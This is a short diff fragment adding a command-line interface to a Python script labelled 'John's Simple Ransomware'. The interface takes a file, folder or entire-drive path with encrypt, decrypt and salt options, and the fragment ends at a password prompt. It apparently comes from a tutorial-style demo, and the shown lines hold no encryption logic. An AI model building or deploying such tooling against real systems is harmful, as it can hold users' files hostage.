@@ -120,4 +120,15 @@ def decrypt_folder(foldername, key):
 
 
 if __name__ == "__main__":
-    parser = argparse.A
+    parser = argparse.ArgumentParser(description="John's Simple Ransomware")
+    parser.add_argument("path", help="Path to encrypt or decrypt. Can be a file, folder, or entire drive")
+    parser.add_argument("-s", "--salt-size", help="If True, a new salt with the passed size is generated", type=int)
+    parser.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the file/folder. (Can't be used with '-d')")
+    parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt the file/folder. (Can't be used with '-e')")
+
+    args = parser.parse_args()
+
+    if args.encrypt:
+        password = getpass.getpass("Enter the password to encrypt: ")
+
+    
